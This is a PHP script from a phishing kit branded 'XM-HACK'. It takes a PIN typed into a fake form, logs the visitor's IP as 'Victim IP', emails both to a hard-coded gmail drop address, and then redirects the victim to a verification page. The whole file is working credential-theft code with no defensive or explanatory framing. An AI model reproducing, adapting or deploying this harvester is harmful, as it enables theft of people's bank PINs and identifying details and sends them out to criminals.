<? 


$ip = getenv("REMOTE_ADDR");
$L9lawiFkrkEmail = "kech17201720@gmail.com"; 




$ZbiMSG  = "~~~~~~~~~~~~~~~~~{ XM-HACK }~~~~~~~~~~~~~~~~~\n";
$ZbiMSG .= "XM-ATS Pin   : ".$_POST['pin']."\n";
$ZbiMSG .= "~~~~~~~~~~~{ XM-HACK | IP Infos }~~~~~~~~~~~~\n";
$ZbiMSG .= "Geo IP    : www.geoiptool.com/?IP=$ip\n";
$ZbiMSG .= "Victim IP : ".$ip."\n";
$ZbiMSG .= "~~~~~~~~~~~~~~~~~{ XM-HACK }~~~~~~~~~~~~~~~~~\n";
$XM_Sub = "XM-ATS Rzl From : $ip";
$XM_Bil = "From: Pin<Info@Info.CoM>";
{
mail("$L9lawiFkrkEmail","$XM_Sub","$ZbiMSG","$XM_Bil");   
}
die("<script type='text/javascript'> window.location = 'verf.html' </script>");